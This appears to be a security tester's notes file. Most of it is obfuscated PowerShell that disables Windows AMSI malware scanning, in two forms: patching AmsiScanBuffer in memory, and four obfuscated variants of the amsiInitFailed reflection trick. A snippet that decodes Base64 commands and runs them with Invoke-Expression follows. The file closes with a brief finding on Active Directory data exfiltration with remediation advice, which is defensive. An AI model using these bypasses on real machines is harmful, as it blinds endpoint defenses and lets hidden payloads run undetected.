# AMSI-Bypass
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
	[DllImport("kernel32")]
 	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  	[DllImport("kernel32")]
   	public static extern IntPtr LoadLibrary(string name);
    	[DllImport("kernel32")]
     	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); 
} 

"@ 

Add-Type $ZQCUW 

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))") 
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))") 
$p = 0 
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) 
$TLML = "0xB8" 
$PURX = "0x57" 
$YNWL = "0x00" 
$RTGX = "0x07" 
$XVON = "0x80" 
$WRUD = "0xC3" 
$KTMJX = [Byte[]] ($TLML, $PURX, $YNWL, $RTGX, + $XVON, + $WRUD) 
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

==========================================================================
NEW AMSI:
S`eT-It`em ( 'V'+'aR' +  'IA' + (('b'+("{1}{0}"-f':1','lE'))+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f(('U'+'ti')+'l'),'A',('Am'+'si'),(('.'+'Man')+('ag'+'e')+('me'+'n')+'t.'),('u'+'to'+(("{1}{0}"-f 'io','mat')+'n.')),'s',(('Sys'+'t')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+('ms'+'i')),'d',('I'+('n'+'itF')+('a'+'ile'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+('t'+'at')),'i',(('N'+'on')+('Pu'+'bl')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})


S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})

=============================================================

! Define the path to the text file containing the Base64-encoded PowerShell commands

$encodedFilePath = "path\to\your\encodedfile.txt"

! Read the Base64-encoded content from the text file

$encodedContent = Get-Content -Path $encodedFilePath

! Decode the Base64-encoded content

$decodedBytes = [System.Convert]::FromBase64String($encodedContent)

$decodedContent = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

! Execute the decoded PowerShell commands

Invoke-Expression $decodedContent


=============================================================

https://github.com/ELMERIKH/Needle/tree/main
https://docs.netapp.com/us-en/ontap-cli-97/application-provisioning-config-modify.html#description

Data Exfiltration via Malicious Scripts

Description: Data exfiltration occurs when malicious scripts, such as PowerUp and PowerView, are used to scan and extract data from an Active Directory (AD) environment. These scripts can enumerate users, groups, permissions, and other sensitive information, which attackers can then exfiltrate.

Impact: Unauthorized access to and exfiltration of AD data can lead to significant data breaches, exposing sensitive organizational information, compromising system integrity, and facilitating further attacks. This can result in severe financial losses, reputational damage, legal penalties, and loss of customer trust.

Remediation: Implement robust monitoring and alerting for unusual script activities and data access patterns. Use endpoint protection and detection systems to block and alert on the execution of known malicious scripts. Regularly audit and restrict administrative privileges. Educate employees about the risks of malicious scripts and enforce strict execution policies.

Implement script whitelisting with AppLocker or Windows Defender Application Control to ensure only trusted and signed scripts are executed, monitor encoding/decoding activities, and use EDR solutions to detect and block suspicious script execution. Restrict PowerShell usage with Constrained Language Mode and enable logging. Segment networks to limit lateral movement and regularly train employees to recognize and report suspicious activities.


https://www.fortinet.com/resources/cyberglossary/data-exfiltration
https://www.forcepoint.com/blog/insights/data-exfiltration-prevention-phi-pii
https://www.sans.org/webcasts/detect-prevent-data-exfiltration-unique-approach-infoblox-104985/
